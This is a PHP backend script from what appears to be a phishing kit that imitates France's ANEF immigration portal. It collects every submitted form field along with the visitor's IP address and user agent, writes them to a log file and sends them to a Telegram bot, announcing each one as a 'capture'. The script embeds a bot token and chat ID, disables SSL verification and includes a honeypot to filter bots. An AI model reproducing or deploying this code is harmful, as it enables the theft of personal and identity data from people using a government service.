<?php
// ⚠️ REMPLACE CES DEUX LIGNES PAR TES INFOS TELEGRAM
define('TELEGRAM_TOKEN', '8829827081:AAEN_tub8v2PT20o73VhR9NHFchzpDVvoZk');
define('TELEGRAM_CHAT_ID', '8676369563');

session_start();

// Récupérer les données POST
$data = $_POST;

// 🔍 JOURNALISATION : tout est écrit dans log.txt
$log = date('Y-m-d H:i:s') . ' | IP: ' . ($_SERVER['REMOTE_ADDR'] ?? '') . ' | ' . json_encode($data) . "\n";
file_put_contents(__DIR__ . '/log.txt', $log, FILE_APPEND | LOCK_EX);

// ✅ Anti-bot basique (honeypot)
if (!empty($data['website'])) {
    http_response_code(200);
    exit;
}

// Nettoyer les données
unset($data['website'], $data['session_token'], $data['form_timer']);

// Si vide, on arrête
if (empty($data)) {
    http_response_code(200);
    exit;
}

// ✅ Fonction d'envoi Telegram
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Désactive la vérification SSL (utile sur certains hébergements)
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    // Journaliser la réponse Telegram
    file_put_contents(__DIR__ . '/log.txt', "Telegram response: HTTP $httpCode | $response | Error: $error\n", FILE_APPEND | LOCK_EX);
    
    return $httpCode == 200;
}

// ✅ Construire le message Telegram
$message = "🚨 *NOUVELLE CAPTURE ANEF*\n";
$message .= "📅 " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 IP: `" . ($_SERVER['REMOTE_ADDR'] ?? 'inconnue') . "`\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";

foreach ($data as $key => $value) {
    if (strpos($key, '_') === 0) continue;
    $label = ucfirst(str_replace('_', ' ', $key));
    $message .= "▫️ *{$label}* : `{$value}`\n";
}

$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔍 User-Agent: " . substr($_SERVER['HTTP_USER_AGENT'] ?? 'inconnu', 0, 100);

// ✅ Envoyer
$sent = sendTelegram($message);

// Journaliser le résultat
file_put_contents(__DIR__ . '/log.txt', "Message " . ($sent ? "ENVOYÉ" : "ÉCHEC") . " sur Telegram\n", FILE_APPEND | LOCK_EX);

// Répondre OK
http_response_code(200);
echo json_encode(['status' => 'ok', 'sent' => $sent]);
?>
